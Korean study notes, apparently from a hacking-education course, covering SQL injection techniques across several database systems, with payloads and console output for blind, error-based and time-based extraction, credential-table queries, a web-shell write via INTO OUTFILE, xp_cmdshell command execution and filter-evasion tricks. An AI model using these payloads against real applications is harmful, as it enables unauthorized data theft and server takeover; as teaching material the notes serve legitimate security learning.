# 기본 쿼리 예약어
select	조회 명령어
from	조회할 테이블 이름
where	조회 조건
order by(ASC\DESC)	결과를 컬럼 기준 정렬
limit	행의 개수와 오프셋 설정
group by	몰라도됨
like	=

그외 DML은 sql관련팁 확인



# UNION SELECT
다수의 SELECT 구문의 결과를 결합하는 절
이전 SELECT 구문과 UNION을 사용한 구문의 실행 결과 중 컬럼의 갯수가 같아야 함
특정 DBMS에서는 이전 SELECT 구문과 UNION을 사용한 구문의 컬럼 타입이 같아야 함

SELECT * FROM UserTable UNION SELECT "admin", "pw";



# Subquery
한 쿼리 내에 또 다른 쿼리를 사용하는 것
쿼리 내에서 괄호 안에 구문을 삽입해야 함

SELECT 1,2,3,(SELECT 456);

컬럼 절에서 서브 쿼리를 사용할 때에는 
단일 행 (Single Row)과 단일 컬럼(Single Column)이 반환되도록 해야 함

mysql> SELECT username, (SELECT "ABCD" UNION SELECT 1234) FROM users;
ERROR 1242 (21000): Subquery returns more than 1 row

FROM 절에서 사용하는 서브 쿼리를 인라인 뷰 (Inline View)
다중 행 (Multiple Row)과 다중 컬럼 (Multiple Column) 결과를 반환할 수 있음

SELECT * FROM (SELECT *, 1234 FROM users) as u;
+----------+------+
| username | 1234 |
+----------+------+
| admin    | 1234 |
| guest    | 1234 |
+----------+------+
2 rows in set (0.00 sec)

WHERE 절에서 서브 쿼리를 사용하면 다중 행 결과를 반환하는 쿼리문을 실행할 수 있음

mysql> SELECT * FROM users WHERE username IN (SELECT "admin" UNION SELECT "guest");
/*
+----------+----------+
| username | password |
+----------+----------+
| admin    | admin    |
| guest    | guest    |
+----------+----------+
2 rows in set (0.00 sec)
*/



# Application Logic(Blind  SQL Injection)
UNION을 사용한 공격
UNION 절을 사용하면 두 개의 SELECT 구문의 결과를 반환하므로 참을 반환할 수 있음

	/?username=' union select 'admin' -- -
	==> True

substring과 length을 사용한 공격
원하는 데이터의 길이를 구하고, 비교를 통해 참거짓 반환

	/?username=' union select if(substr(password,1,1)='B', 'admin', 'not admin') from users where username='admin' -- -
	==> False
	/?username=' union select if(substr(password,1,1)='P', 'admin', 'not admin') from users where username='admin' -- -
	==> True
	/?username=' union select if(substr(password,2,1)='a', 'admin', 'not admin') from users where username='admin' -- -
	==> True

참 거짓 판단 쿼리
대부분의 경우에 어플리케이션 화면에서 참 거짓을 판별할 수 있는 쿼리이다.

	'or 1=1 limit 0,1;--
	'or 1=2 limit 0,1;--

사실 limit문은 없어도 되지만, 간혹 select조회 결과값이 하나인지를 필터링하기도 한다.



# 더 효율적인 공격 쿼리
Binary Search(이진탐색)
아스키에서 출력 가능한 문자의 범위는 32~126
패스워드의 첫 번째 바이트가 79보다 큰 값인지 확인

	mysql> select * from users where username='admin' and ascii(substr(password, 1, 1))>79;
	+----------+----------+
	| username | password |
	+----------+----------+
	| admin    | P@ssword |
	+----------+----------+
	1 row in set (0.00 sec)

Bit 연산
ASCII는 0부터 127 범위의 문자를 표현할 수 있고,
이는 곧 7 개의 비트를 통해 하나의 문자를 나타낼 수 있다는 것을 의미
MySQL에서는 숫자를 비트 형태로 변환하는 bin이라는 함수를 제공

	mysql> select * from users where username='admin' and substr(bin(ord(password)),1,1)=1;
	+----------+----------+l
	| username | password |
	+----------+----------+
	| admin    | P@ssword |
	+----------+----------+
	1 row in set (0.00 sec)
	mysql> select * from users where username='admin' and substr(bin(ord(password)),2,1)=1;
	Empty set (0.00 sec)

group_concat
아래 쿼리의 결과는 admin:admin,guest:password,test:test1 과 같은 형태를 가진다.

	group_concat(username,0x3a,password)

응용하면 다음과 같음

	if(ord(substr((select group_concat(username,0x3a,password) from users), 37,1))=126, (select 1 union select 2), 0)




# Error based SQL Injection
애플리케이션에서 발생하는 에러를 이용해 공격
문법 에러와 같이 DBMS에서 쿼리가 실행되기 전에 발생하는 에러가 아닌 
런타임 (Runtime) 즉, 쿼리가 실행되고나서 발생하는 에러가 필요

SELECT extractvalue(1,concat(0x3a,version()));
/*
ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
*/

extractvalue 함수는 첫 번째 인자로 전달된 XML 데이터에서 두 번째 인자인 XPATH 식을 통해 데이터를 추출
만약, 두 번째 인자가 올바르지 않은 XPATH 식일 경우 
올바르지 않은 XPATH 식이라는 에러 메시지와 함께 잘못된 식을 출력

mysql> SELECT extractvalue('<a>test</a> <b>abcd</b>', '/a');
+-----------------------------------------------+
| extractvalue('<a>test</a> <b>abcd</b>', '/a') |
+-----------------------------------------------+
| test                                          |
+-----------------------------------------------+
1 row in set (0.00 sec)

mysql> SELECT extractvalue(1, ':abcd');
ERROR 1105 (HY000): XPATH syntax error: ':abcd'
# ":" 로 시작하면 올바르지 않은 XPATH 식

해당 함수를 이용해 데이터베이스의 정보를 추출할 수 있다.
concat를 통해 데이터 앞에 0x3a(:) 붙이는 이유는 의도적으로 실행 중에 오류를 일으키기 위함이다.

mysql> SELECT extractvalue(1,concat(0x3a,(SELECT password FROM users WHERE username='admin')));
ERROR 1105 (HY000): XPATH syntax error: ':Th1s_1s_admin_PASSW@rd'

다음은 DBMS별로 Error based SQLI를 통해 공격하는 방법이다.

MySQL
Figure 7. MySQL Error based SQLI 응용 예시 - 1

SELECT updatexml(null,concat(0x0a,version()),null);
/*
ERROR 1105 (HY000): XPATH syntax error: '
5.7.29-0ubuntu0.16.04.1-log'
*/


Figure 8. MySQL Error based SQLI 응용 예시 - 2

SELECT extractvalue(1,concat(0x3a,version()));
/*
ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
*/


Figure 9. MySQL Error based SQLI 응용 예시 - 3

SELECT COUNT(*), CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x;
/*
ERROR 1062 (23000): Duplicate entry '5.7.29-0ubuntu0.16.04.1-log:1' for key '<group_key>'
*/
MSSQL
Figure 10. MSSQL Error based SQLI 응용 예시 - 1

SELECT convert(int,@@version);
SELECT cast((SELECT @@version) as int);
/*
Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2014 - 12.0.2000.8 (Intel X86) 
	Feb 20 2014 19:20:46 
	Copyright (c) Microsoft Corporation
	Express Edition on Windows NT 6.3 <X64> (Build 9600: ) (WOW64) (Hypervisor)
' to data type int.
*/
Oracle
Figure 11. Oracle Error based SQLI 응용 예시 - 1

SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual;
/*
ORA-20000: Oracle Text error:
DRG-11701: thesaurus Oracle Database 18c Express Edition Release 18.0.0.0.0 - Production does not exist
ORA-06512: at "CTXSYS.DRUE", line 183
ORA-06512: at "CTXSYS.DRITHSX", line 555
ORA-06512: at line 1
*/

order를 이용한 SQLI
order by절은 관련 없는 하나의 값을 받아도 실행은 되지만 
아래 참일 경우와 같이 row가 2개이상인 테이블 형태는 오류가 나온다.

	order by if(ord(substr((select group_concat(username,0x3a,password) from users), 37,1))=126, (select 1 union select 2), 0)



# Error based Blind SQL Injection
Blind SQLI와 Error based SQLI를 동시에 활용하는 공격 기법
에러 발생 여부만을 필요로하기 때문에 용이하게 사용할 수 있음

mysql> select if(1=1, 9e307*2,0);
ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 2)'
mysql> select if(1=0, 9e307*2,0);
+--------------------+
| if(1=0, 9e307*2,0) |
+--------------------+
|                  0 |
+--------------------+
1 row in set (0.00 sec)


여기서 if의 인자는 앞에서 순서대로 조건문, 참일 때, 거짓일 때 반환할 값을 나타낸다.



# Short-circuit evaluation
로직 연산의 원리를 이용해 공격하는 방법

mysql> SELECT 0 AND SLEEP(1);
+----------------+
| 0 AND SLEEP(1) |
+----------------+
|              0 |
+----------------+
1 row in set (0.00 sec)
mysql> SELECT 1 AND SLEEP(10);
+-----------------+
| 1 AND SLEEP(10) |
+-----------------+
|               0 |
+-----------------+
1 row in set (10.04 sec)

mysql> SELECT 1=1 or 9e307*2;
+----------------+
| 1=1 or 9e307*2 |
+----------------+
|              1 |
+----------------+
1 row in set (0.00 sec)
mysql> SELECT 1=0 or 9e307*2;
ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 2)'



# Time based SQL Injection
시간 지연을 이용해 쿼리의 참/거짓 여부를 판단하는 공격 기법
간을 지연시키는 방법으로는 
DBMS에서 제공하는 함수 또는 시간이 많이 소요되는 연산을 수행하는 
헤비 쿼리 (heavy query)를 사용하는 방법이 있음

mysql> SELECT IF(1=1, sleep(1), 0);
/*
mysql> SELECT IF(1=1, sleep(1), 0);
+----------------------+
| IF(1=1, sleep(1), 0) |
+----------------------+
|                    0 |
+----------------------+
1 row in set (1.00 sec)
*/
mysql> SELECT IF(1=0, sleep(1), 0);
/*
mysql> SELECT IF(1=0, sleep(1), 0);
+----------------------+
| IF(1=0, sleep(1), 0) |
+----------------------+
|                    0 |
+----------------------+
1 row in set (0.00 sec)
*/

다음은 DBMS별로 시간끄는 방법을 나열한 것

MySQL
Figure 13. sleep 함수 사용 예시

/* SLEEP(duration) */
mysql> SELECT SLEEP(1);
+----------+
| SLEEP(1) |
+----------+
|        0 |
+----------+
1 row in set (1.00 sec)


Figure 14. benchmark 함수 사용 예시

/*benchmark()는 expr을 count만큼 반복하는 함수다.
아래는 1이라는 데이터에 SHA1해쉬함수를 400000000번 한 연산인 것이다.*/
/* BENCHMARK(count, expr) */
mysql> SELECT BENCHMARK(40000000,SHA1(1));
+-----------------------------+
| BENCHMARK(40000000,SHA1(1)) |
+-----------------------------+
|                           0 |
+-----------------------------+
1 row in set (10.78 sec)


Figure 15. 헤비 쿼리 사용 예시

/*from절에 여러테이블을 콤마로 나열하면, 기본적으로 크로스 조인이 된다*/
mysql> SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C) as heavy;
+----------+
| heavy    |
+----------+
| 24897088 |
+----------+
1 row in set (1.41 sec)
mysql> SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B) as heavy;
+-------+
| heavy |
+-------+
| 85264 |
+-------+
1 row in set (0.01 sec)
mysql> SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C) as heavy;
+----------+
| heavy    |
+----------+
| 24897088 |
+----------+
1 row in set (1.38 sec)

MSSQL
Figure 16. WAITFOR 사용 예시

/* waitfor delay 'time_to_pass'; */
> SELECT '' if((select 'abc')='abc') waitfor delay '0:0:1';
Execution time: 1,02 sec, rows selected: 0, rows affected: 0, absolute service time: 1,17 sec, absolute service time: 1,16 sec


Figure 17. 헤비 쿼리 사용 예시

select (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C, information_schema.columns D, information_schema.columns E, information_schema.columns F)
/*
Execution time: 6,36 sec, rows selected: 1, rows affected: 0, absolute service time: 6,53 sec, absolute service time: 6,53 sec
*/

SQLite
Figure 18. 헤비 쿼리 사용 예시

/* LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))) */
sqlite> .timer ON
sqlite> SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1500000000/2))));
0
Run Time: real 9.740 user 7.983349 sys 1.743972



# System Tables
DBMS마다 데이터베이스의 정보를 포괄하는 시스템 테이블이 존재
시스템 테이블에는 설정 및 계정 정보 외에도 테이블과 컬럼 정보, 
현재 실행되고 있는 쿼리의 정보 등 다양한 정보를 포함하고 있음

MYSQL
mysql 초기설치시, information_schema와 mysql, performance_schema, sys 데이터베이스가 있음

	mysql> show databases;
	/*
	+--------------------+
	| Database           |
	+--------------------+
	| information_schema |
	| DREAMHACK          | # 이용자 정의 데이터베이스
	| mysql              |
	| performance_schema |
	| sys                |
	+--------------------+
	*/

전체 스키마 정보 조회

	mysql> select TABLE_SCHEMA from information_schema.tables group by TABLE_SCHEMA;
	/*
	+--------------------+
	| TABLE_SCHEMA       |
	+--------------------+
	| information_schema |
	| DREAMHACK          |
	| mysql              |
	| performance_schema |
	| sys                |
	+--------------------+
	5 rows in set (0.01 sec)
	*/

테이블 정보 조회

	mysql> select TABLE_SCHEMA, TABLE_NAME from information_schema.TABLES;
	/*
	+--------------------+----------------+
	| TABLE_SCHEMA       | TABLE_NAME     |
	+--------------------+----------------+
	| information_schema | CHARACTER_SETS |
	...
	| DREAMHACK          | users          |
	| mysql              | db             |
	...
	+--------------------+----------------+
	292 rows in set (0.01 sec)
	*/

컬럼 정보 조회

	mysql> select TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS;
	/*
	+--------------------+----------------+--------------------+
	| TABLE_SCHEMA       | TABLE_NAME     | COLUMN_NAME        |
	+--------------------+----------------+--------------------+
	| information_schema | CHARACTER_SETS | CHARACTER_SET_NAME |
	...
	| DREAMHACK          | users          | uid                |
	| DREAMHACK          | users          | upw                |
	...
	| mysql              | db             | Db                 |
	| mysql              | db             | User               |
	...
	+--------------------+----------------+--------------------+
	3132 rows in set (0.07 sec)
	*/

실시간 실행쿼리 조회

	mysql> select * from information_schema.PROCESSLIST;
	/*
	+-------------------------------------------------+
	| info                                            |
	+-------------------------------------------------+
	| select info from information_schema.PROCESSLIST |
	+-------------------------------------------------+
	1 row in set (0.00 sec)
	*/

	mysql> select user,current_statement from sys.session;
	/*
	+----------------+------------------------------------------------+
	| user           | current_statement                              |
	+----------------+------------------------------------------------+
	| root@localhost | select user,current_statement from sys.session |
	+----------------+------------------------------------------------+
	1 row in set (0.05 sec)
	*/

DBMS 계정정보

	mysql> select GRANTEE,PRIVILEGE_TYPE,IS_GRANTABLE from information_schema.USER_PRIVILEGES;
	/*
	+-------------------------+-------------------------+--------------+
	| GRANTEE                 | PRIVILEGE_TYPE          | IS_GRANTABLE |
	+-------------------------+-------------------------+--------------+
	| 'root'@'localhost'      | SELECT                  | YES          |
	...
	| 'root'@'localhost'      | SUPER                   | YES          |
	...
	| 'user_test'@'localhost' | USAGE                   | NO           |
	+-------------------------+-------------------------+--------------+
	58 rows in set (0.00 sec)
	*/

	mysql> select User, authentication_string from mysql.user;
	/*
	+------------------+-------------------------------------------+
	| User             | authentication_string                     |
	+------------------+-------------------------------------------+
	| root             | *...                                      |
	| mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
	| mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
	| user_test        | *...                                      |
	+------------------+-------------------------------------------+
	4 rows in set (0.00 sec)
	*/


MSSQL
초기 설치 시 master와 tempdb, model, 그리고 msdb 데이터베이스가 있음

	SELECT name FROM sys.databases
	/*
	name
	-------
	master
	tempdb
	model
	msdb
	dreamhack # 이용자 정의 데이터베이스 (예시)
	*/

데이터베이스 정보 조회
DB_NAME(0) 은 현재 사용중인 DB

	SELECT name FROM master..sysdatabases;
	/*
	name
	-------
	master
	tempdb
	model
	msdb
	dreamhack # 이용자 정의 데이터베이스 (예시)
	*/

	SELECT DB_NAME(1);
	/*
	master
	*/

테이블 정보 조회
xtype='U'는 이용자 정의 테이블을 의미

	SELECT name FROM dreamhack..sysobjects WHERE xtype = 'U';
	# xtype='U' 는 이용자 정의 테이블을 의미합니다.
	/*
	name
	-------
	users
	*/

	SELECT table_name FROM dreamhack.information_schema.tables;
	/*
	table_name
	-----------
	users
	*/

컬럼 정보 조회

	SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users');
	/*
	name
	-----
	uid
	upw
	*/

	SELECT table_name, column_name FROM dreamhack.information_schema.columns;
	/*
	table_name	column_name
	-------------------------
	users		uid
	users		upw
	*/

DBMS 계정 정보 조회

	SELECT name, password_hash FROM master.sys.sql_logins;
	/*
	name		password_hash
	--------------------------
	sa			NULL
	dreamhack	NULL
	*/

	SELECT * FROM master..syslogins;


PostgreSQL
설치 시 초기에 postgres와 template1, template0 데이터베이스가 있음

	postgres=$ select datname from pg_database;
	/*
	  datname  
	-----------
	 postgres
	 template1
	 template0
	(3 rows)
	*/

스키마(카탈로그) 정보 조회
주요 정보를 담고 있는 테이블을 포함한 스키마는 pg_catalog, information_schema가 있음

	postgres=$ select nspname from pg_catalog.pg_namespace;
	/*
	      nspname       
	--------------------
	 pg_toast
	 pg_temp_1
	 pg_toast_temp_1
	 pg_catalog
	 public
	 information_schema
	(6 rows)
	*/

주요 테이블 스키마 정보 조회

	postgres=$ select table_name from information_schema.tables where table_schema='pg_catalog';
	/*
	           table_name
	---------------------------------
	pg_shadow
	pg_settings
	pg_database
	pg_stat_activity
	...
	*/
	postgres=# select table_name from information_schema.tables where table_schema='information_schema';
	/*
	              table_name
	---------------------------------------
	schemata
	tables
	columns
	...
	*/

DBMS 계정 정보 조회

	postgres=$ select usename, passwd from pg_catalog.pg_shadow;
	/*
	 usename  |               passwd
	----------+-------------------------------------
	 postgres | md5df6802cb10f4000bf81de27261c1155f
	(1 row)
	*/

DBMS 설정 정보 조회

	postgres=$ select name, setting from pg_catalog.pg_settings;
	/*
	                  name                  |                 setting
	----------------------------------------+------------------------------------------
	 allow_system_table_mods                | off
	 application_name                       | psql
	 ...
	*/

실시간 실행 쿼리 확인

	postgres=$ select usename, query from pg_catalog.pg_stat_activity;
	/*
	 usename  |                          query                          
	----------+---------------------------------------------------------
	 postgres | select usename, query from pg_catalog.pg_stat_activity;
	(1 row)
	*/

테이블 정보 조회

	postgres=$ select table_schema, table_name from information_schema.tables;
	/*
	    table_schema    |              table_name
	--------------------+---------------------------------------
	 pg_catalog         | pg_statistic
	...
	 information_schem  | information_schema_catalog_name
	...
	*/

컬럼 정보 조회

	postgres=$ select table_schema, table_name, column_name from information_schema.columns;
	/*
	    table_schema    |      table_name         |    column_name
	--------------------+-------------------------+------------------
	 pg_catalog         | pg_stat_user_indexes    | relid
	...
	 information_schema | view_routine_usage      | specific_name
	...
	*/

Oracle

데이터베이스 정보
all_tables는 현재 사용자가 접근할 수 있는 테이블의 집합

	SELECT DISTINCT owner FROM all_tables
	SELECT owner, table_name FROM all_tables

컬럼 정보 조회

	SELECT column_name FROM all_tab_columns WHERE table_name = 'users'

DBMS 계정 정보 조회

	SELECT * FROM all_users

SQLite

시스템 테이블

	sqlite> .header on
	-- 콘솔에서 실행 시 컬럼 헤더를 출력하기 위해 설정합니다.
	sqlite> select * from sqlite_master;
	/*
	type|name|tbl_name|rootpage|sql
	table|users|users|2|CREATE TABLE users (uid text, upw text)
	*/


# DBMS Fingerprinting
DBMS 종류와 버전 알아내기
아래는 위 정보를 알아내기 위한 범용적인 방법이다.
각각의 DBMS별로 구체적인 쿼리는 아래에 분류해놨음 

/* 환경변수, 함수를 이용해 버전정보 알아내기 */
SELECT @@version
SELECT version()

/* 에러 메시지로 DBMS 확인하기 */
select 1 union select 1, 2;
# MySQL => ERROR 1222 (21000): The used SELECT statements have a different number of columns
(select * from not_exists_table)
# SQLite => Error: no such table: not_exists_table

/* Blind SQL Injection을 이용해 버전 정보를 한 바이트씩 비교하여 알아내기 */
mid(@@version, 1, 1)='5';
substr(version(), 1, 1)='P';

/* 출력이 존재하지 않는다면 시간 지연 함수로 알아내기 */
sleep(10)
pg_sleep(10)


MYSQL

mysql> select @@version; # select version();
+-------------------------+
| @@version               |
+-------------------------+
| 5.7.29-0ubuntu0.16.04.1 |
+-------------------------+
1 row in set (0.00 sec)

mysql> select 1 union select 1, 2;
ERROR 1222 (21000): The used SELECT statements have a different number of columns

# @@version => '5.7.29-0ubuntu0.16.04.', mid(@@version, 1, 1) => '5'
mysql> select mid(@@version, 1, 1)='5';
+------------------------+
| mid(@@version,1,1)='5' |
+------------------------+
|                      1 |
+------------------------+
1 row in set (0.00 sec)
mysql> select mid(@@version, 1, 1)='6';
+------------------------+
| mid(@@version,1,1)='6' |
+------------------------+
|                      0 |
+------------------------+
1 row in set (0.00 sec)

mysql> select mid(@@version, 1, 1)='6' and sleep(2);
+---------------------------------------+
| mid(@@version, 1, 1)='6' and sleep(2) |
+---------------------------------------+
|                                     0 |
+---------------------------------------+
1 row in set (0.00 sec)
mysql> select mid(@@version, 1, 1)='5' and sleep(2);
+---------------------------------------+
| mid(@@version, 1, 1)='5' and sleep(2) |
+---------------------------------------+
|                                     0 |
+---------------------------------------+
1 row in set (2.00 sec)


PostgreSQL

postgres=$ select version();
version
--------
 PostgreSQL 12.2 (Debian 12.2-2.pgdg100+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit
(1 row)

postgres=$ select 1 union select 1, 2;
ERROR:  each UNION query must have the same number of columns
LINE 1: select 1 union select 1, 2;

/* version() => 'PostgreSQL ...', substr(version(), 1, 1) => 'P' */
postgres=$ select substr(version(), 1, 1)='P';
 ?column?
----------
 t
(1 row)
postgres=# select substr(version(), 1, 1)='Q';
 ?column?
----------
 f
(1 row)

postgres=$ select substr(version(), 1, 1)='P' and pg_sleep(10);
 pg_sleep
----------
(1 row)


MSSQL

> select @@version;
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Microsoft SQL Server 2017 (RTM-CU13) (KB4466404) - 14.0.3048.4 (X64)
	Nov 30 2018 12:57:58
	Copyright (C) 2017 Microsoft Corporation
	Developer Edition (64-bit) on Linux (Ubuntu 16.04.5 LTS)
(1 rows affected)

> select 1 union select 1, 2;
Msg 205, Level 16, State 1, Server e2cb36ec2593, Line 1
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.asdf

-- @@version => 'Microsoft SQL Server...', substring(@@version, 1, 1) => 'M'
> select 1 from test where substring(@@version, 1, 1)='M';
-----------
          1
(1 rows affected)
1> select 1 from test where substring(@@version, 1, 1)='N';
2> go
-----------
(0 rows affected)

select 1 where substring(@@version, 1, 1)='M' and waitfor delay '0:0:5';


SQLite

sqlite> select sqlite_version();
3.11.0

sqlite> select 1 union select 1, 2;
Error: SELECTs to the left and right of UNION do not have the same number of result columns

-- sqlite_version() => '3.11.0', substr(sqlite_version(), 1, 1) => '3'
sqlite> select substr(sqlite_version(), 1, 1)='3';
1
sqlite> select substr(sqlite_version(), 1, 1)='4';
0

select case when substr(sqlite_version(), 1, 1)='3' then LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2)))) else 1=1 end;



# DBMS Misconfiguration
Out of DBMS: MySQL
MySQL에서 파일 관련된 작업을 할 때에는 mysql 권한으로 수행
“my.cnf” 설정 파일의 secure_file_priv 값에 영향을 받음
secure_file_priv는 mysql 쿼리 내에서 load_file 혹은 outfile을 이용해 파일에 접근할 수 있음
기본적으로 secure_file_priv의 값은 /var/lib/mysql-files/임

	# my.cnf
	[mysqld]
	# secure_file_priv = ""   # 미설정. 기본 설정 값으로 설정됩니다.
	secure_file_priv = "/tmp" # 해당 디렉터리 하위 경로에만 접근 가능합니다.
	secure_file_priv = ""     # mysql의 권한이 가능한 모든 경로에 접근이 가능합니다.
	secure_file_priv = NULL   # 기능이 비활성화 됩니다.

secure_file_priv 값 조회

	mysql> select @@secure_file_priv;
	+-----------------------+
	| @@secure_file_priv    |
	+-----------------------+
	| /var/lib/mysql-files/ |
	+-----------------------+

load_file 함수는 인자로 전달된 파일을 읽고, 출력함
이때, 전달되는 파일은 전체 경로를 입력해야 하며 해당 파일에 접근 권한이 있어야 함

	# echo test1234 > /var/lib/mysql-files/test
	mysql> select load_file('/var/lib/mysql-files/test');
	+----------------------------------------+
	| load_file('/var/lib/mysql-files/test') |
	+----------------------------------------+
	| test1234                               |
	+----------------------------------------+

SELECT ... INTO 형식의 쿼리는 쿼리 결과를 변수나 파일에 쓸 수 있음

	SELECT ... INTO var_list             # column 값을 변수에 저장
	SELECT ... INTO OUTFILE  'filename'  # 쿼리 결과의 rows 값을 파일에 저장
	SELECT ... INTO DUMPFILE 'filename'  # 쿼리 결과(single row)를 파일에 저장

만약 secure_file_priv의 값이 올바르지 않아 임의 경로에서 파일 작업을 수행할 수 있다면
이를 통해 웹셸을 업로드하는 등의 공격이 가능

	mysql> select '<?=`ls`?>' into outfile '/tmp/a.php';
	/* <?php include $_GET['page'].'.php'; // "?page=../../../tmp/a" */
	/*<?php include $_GET['page'].'.php  이 부분이 이미 웹서버에 있다고 가정할때, 
	mysql outfile 이용해서 악성 php 코드를 웹서버가 실행할 수 있는 곳에 저장해두고 나서  
	page매개변수로 ../../../tmp/a 이 값을 넣어주면 악성코드를 실행할 수 있음*/


Out of DBMS: MSSQL
MSSQL에서는 xp_cmdshell 기능을 이용해 OS 명령어를 실행할 수 있음
해당 기능의 활성화 여부를 판단하는 쿼리는 다음과 같음
해당 쿼리의 실행 결과에서 1이 반환되면 활성화, 0이라면 비활성화 상태를 의미

	SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'

만약 xp_cmdshell 기능이 활성화되어 있는 경우,
아래와 같은 방식으로 OS 명령어를 실행할 수 있음

	EXEC xp_cmdshell "net user";
	EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';


DBMS 문자열 비교 주의 사항
각각의 DBMS는 문자열을 비교하는 방법이 서로 다름
같은 이유로 웹 애플리케이션과 DBMS에서 문자열을 비교하는 방식이 다를 수 있음

	<?php
	...
	// $input = "Admin"; # 대소문자 구분
	// $input = "admin "; # 공백 문자로 끝나는 문자열 비교
	if($input === "admin") die("can't account lookup"); // filter bypass
	/*
	DBMS
	uid: admin, account_info: secret
	...
	*/
	echo query("select account_info from users where uid='{$input}';");

MySQL과 MSSQL에서는 비교 연산에서 대소문자를 구분하지 않음

	mysql> select 'a'='A';
	/*
	+---------+
	| 'a'='A' |
	+---------+
	|       1 |
	+---------+
	*/

	> select 1 from test where 'a'='A';
	/*
	-----------
	          1
	*/

일부 DBMS에서는 비교 연산 시 할당된 컬럼의 크기에 맞게 공백 문자를 채운 후에 비교
예를 들어, CHAR(5)로 생성된 컬럼에 “ab”라는 데이터가 입력되면 이는 “ab   ”가 

	mysql> select 'a'='a ';
	/*
	+---------+
	| 'a'='a '|
	+---------+
	|       1 |
	+---------+
	*/

	> select 1 from test where 'a'='a ';
	/*
	-----------
	          1
	*/


DBMS 다중 쿼리 주의 사항
다중 쿼리 (Multi Query)는 다음 예시와 같이 하나의 요청에 다수의 쿼리 구문을 사용하는 것을 의미
만약, 애플리케이션에서 다중 쿼리를 지원한다면 
공격자는 본래 실행되는 쿼리문에 새로운 쿼리를 작성해 
데이터베이스를 삭제하거나 값을 추가하는 등의 행위가 가능
이런 위험성 때문에 대부분의 웹 애플리케이션은 DBMS에 쿼리를 전송할 때 다중 쿼리를 지원하지 않음

PDO의 query 함수는 다중 쿼리를 지원하지 않고, 
exec 함수에서는 다중 쿼리를 실행한다는 차이점이 있음

	<?php
	    $db1 = new PDO('sqlite:test1.db');
	    $db2 = new PDO('sqlite:test2.db');
	    $query = 'select 1234;create table test(test int);';
	    $db1->query($query);
	    $db2->exec($query);
	?>

	$ php test.php
	$ ls -al test1.db test2.db
	-rw-r--r-- 1 test test    0 Apr 29 11:21 test1.db # create table이 실행되지 않음
	-rw-r--r-- 1 test test 2048 Apr 29 11:20 test2.db # create table이 실행됨



# 탐지 우회
대소문자 검사 미흡

UnIoN SeLecT 1,2,3
selECT SlEep(5)


탐지 과정 미흡

UNunionION SELselectECT 1,2 --
# => UNION SELECT 1,2 --  


문자열 검사 미흡

mysql> SELECT reverse('nimda'), concat('adm','in'), x'61646d696e', 0x61646d696e;
/*
+------------------+--------------------+---------------+--------------+
| reverse('nimda') | concat('adm','in') | x'61646d696e' | 0x61646d696e |
+------------------+--------------------+---------------+--------------+
| admin            | admin              | admin         | admin        |
+------------------+--------------------+---------------+--------------+
1 row in set (0.00 sec)
*/


연산자 검사 미흡
^, =, !=, %, _, /, *, &, &&, |, ||, >, <, XOR, DIV, LIKE, 
RLIKE, REGEXP, IS, IN, NOT, MATCH, AND, OR, BETWEEN, ISNULL ...

 mysql> select 1 || 1;
 /*
 +--------+
| 1 || 1 |
+--------+
|      1 |
+--------+
1 row in set (0.00 sec)
*/

특히 %, _는 와일카드라고 불림
substring, substr, mid, pad, left, right 이런 함수들이 필터링되어 있을 때,
다음과 같이 우회할 수 있음

uid=admin" and upw like "p%"-- 


공백 탐지 미흡

mysql> SELECT/**/'abc';
/*
+-----+
| abc |
+-----+
| abc |
+-----+
1 row in set (0.00 sec)
*/

mysql> select`username`,(password)from`users`WHERE`username`='admin';
/*
+----------+----------------+
| username | password       |
+----------+----------------+
| admin    | admin_password |
+----------+----------------+
1 row in set (0.00 sec)
*/


MYSQL 우회 기법
문자열 검사 우회

	mysql> select 0x6162, 0b110000101100010;
	/*
	+--------+-------------------+
	| 0x6162 | 0b110000101100010 |
	+--------+-------------------+
	| ab     | ab                |
	+--------+-------------------+
	1 row in set (0.00 sec)
	*/

	mysql> select char(0x61, 0x62);
	/*
	+------------------+
	| char(0x61, 0x62) |
	+------------------+
	| ab               |
	+------------------+
	1 row in set (0.00 sec)
	*/
	mysql> select concat(char(0x61), char(0x62));
	/*
	+--------------------------------+
	| concat(char(0x61), char(0x62)) |
	+--------------------------------+
	| ab                             |
	+--------------------------------+
	*/

	mysql> select mid(@@version,12,1);
	/*
	+---------------------+
	| mid(@@version,12,1) |
	+---------------------+
	| n                   |
	+---------------------+
	*/

공백 검사 우회

	mysql> select
	    -> 1;
	/*
	+---+
	| 1 |
	+---+
	| 1 |
	+---+
	*/

	mysql> select/**/1;
	/*
	+---+
	| 1 |
	+---+
	| 1 |
	+---+
	*/

	Tab : %09
	no=1%09or%09id='admin'
	 
	Line Feed (\n) : %0a
	no=1%0aor%0aid='admin'

	Carrage Return (\r) : %0d
	no=1%0dor%0did='admin'

	vertical tab (\v) : %0b
	form feed (\f) : %oc

	괄호 : ()
	no=(1)or(id='admin')

	더하기 : +
	no=1+or+id='admin'


주석구문 실행(/*! */)

